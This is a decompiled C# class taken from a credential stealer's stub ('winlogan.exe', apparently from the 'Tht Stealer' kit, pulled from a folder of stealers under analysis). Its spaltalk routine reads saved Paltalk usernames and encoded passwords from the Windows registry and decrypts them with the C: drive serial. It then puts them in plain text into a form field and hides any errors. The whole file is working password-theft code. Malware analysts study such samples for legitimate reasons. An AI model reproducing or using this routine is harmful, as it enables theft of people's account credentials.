// Decompiled with JetBrains decompiler
// Type: PalTalk
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Management;

[StandardModule]
internal sealed class PalTalk
{
  public static string GetHDSerial()
  {
    return new ManagementObject("Win32_LogicalDisk.DeviceID=\"C:\"").Properties["VolumeSerialNumber"].Value.ToString();
  }

  public static void spaltalk()
  {
    try
    {
      char[] chArray1 = PalTalk.GetHDSerial().ToCharArray();
      RegistryKey registryKey1 = Registry.CurrentUser;
      RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Paltalk");
      string[] subKeyNames = registryKey2.GetSubKeyNames();
      registryKey2.Close();
      string[] strArray1 = subKeyNames;
      int index1 = 0;
      while (index1 < strArray1.Length)
      {
        string str1 = strArray1[index1];
        string str2 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Paltalk\\" + str1, "pwd", (object) ""));
        char[] chArray2 = str2.ToCharArray();
        string[] strArray2 = new string[checked ((int) Math.Round(unchecked ((double) str2.Length / 4.0)) + 1)];
        int index2;
        while (index2 <= checked (Information.UBound((Array) chArray2, 1) - 4))
        {
          int index3;
          if (index2 < checked (Information.UBound((Array) chArray2, 1) - 4))
            strArray2[index3] = Conversions.ToString(chArray2[index2]) + Conversions.ToString(chArray2[checked (index2 + 1)]) + Conversions.ToString(chArray2[checked (index2 + 2)]);
          checked { index2 += 4; }
          checked { ++index3; }
        }
        string str3 = "";
        string str4 = str1;
        int index4 = 0;
        int length = str4.Length;
        while (index4 < length)
        {
          char ch = str4[index4];
          str3 = str3 + Conversions.ToString(ch);
          int index3;
          if (index3 <= Information.UBound((Array) chArray1, 1))
            str3 = str3 + Conversions.ToString(chArray1[index3]);
          checked { ++index3; }
          checked { ++index4; }
        }
        string str5 = str3 + str3 + str3;
        char[] chArray3 = str5.ToCharArray();
        string str6 = "" + Conversions.ToString(Strings.Chr(checked ((int) Math.Round(unchecked (Conversions.ToDouble(strArray2[0]) - 122.0 - (double) Strings.Asc(str5.Substring(checked (str5.Length - 1), 1)))))));
        int num1 = 1;
        int num2 = Information.UBound((Array) strArray2, 1);
        int index5 = num1;
        while (index5 <= num2)
        {
          if (strArray2[index5] != null)
          {
            char ch = Strings.Chr(checked ((int) Math.Round(unchecked (Conversions.ToDouble(strArray2[index5]) - (double) index5 - (double) Strings.Asc(chArray3[checked (index5 - 1)]) - 122.0))));
            str6 = str6 + Conversions.ToString(ch);
          }
          checked { ++index5; }
        }
        MyProject.Forms.Form1.paltalkt.Text = "Username: " + str1 + "\r\nPassword: " + str6;
        checked { ++index1; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
